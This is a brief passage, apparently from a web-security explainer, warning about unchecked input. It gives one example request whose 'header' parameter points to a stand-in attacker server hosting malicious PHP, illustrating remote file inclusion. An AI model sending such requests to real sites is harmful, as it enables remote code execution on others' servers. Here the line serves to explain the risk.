...
If not properly caught, an attacker could submit a request like `https://yourwebsite.com/?header=http://attackersserver.com/malicouscode.php`
...
It looks confusing because, well, it is, but that's for another time.
